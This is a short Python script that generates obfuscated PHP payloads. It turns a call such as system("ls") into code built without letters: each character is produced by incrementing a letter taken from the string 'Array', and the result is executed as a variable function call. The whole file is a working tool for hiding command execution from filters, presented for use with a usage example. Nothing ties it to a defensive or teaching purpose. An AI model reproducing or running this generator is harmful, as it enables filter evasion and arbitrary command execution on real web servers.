import sys

delta=97 # ord(a), step = ord(needletter - delta)
delimeter="\n"

def convertCode(id, strings):
	increment_letter = "$__++;"	
	zeroing_letter = "$__=$_;"

	# $_ - start of alphabet (a), $__ - tmp var for increment letter, 
	code = ""
	for l in strings:
		if l.isalpha():
			step = ord(l) - delta
			code += increment_letter * step + delimeter
			code += id + ".=$__;" + delimeter
			code += zeroing_letter + delimeter
		else:
			code += id + ".='" + l + "';" + delimeter
			code += zeroing_letter + delimeter
	return code

def makingCode(command, argument):
	code = '''
$_=[];
$_=@"$_";
$__="!"=="!";
$__=+$__;$__++;$__++; 
$_=$_[$__];
$__=$_;
$___="";
$____="";
''' #a
	execute_command = "$___($____)" # 	$___ (3) - command, $____ (4) - argument
	code += convertCode("$___", command)
	code += convertCode("$____", argument)
	code += execute_command
	print ( code )

def main():
	if len(sys.argv) != 1:
		strings = sys.argv[1]
		command = strings.split('(')[0]
		argument = strings.split('(')[1]
		argument = argument.replace('"','')
		argument = argument.replace(')','')
		makingCode(command,argument)
	else:
		pasta = " Usage: python generate_php_commands.py *command php*. \n For example: python generate_php_commands.py system(\"ls\").\n Check OS where PHP code will be executed. \n Also you can change delimeter in code from CRLS to space or something else."
		print(pasta)

if __name__ == "__main__":
    main()
	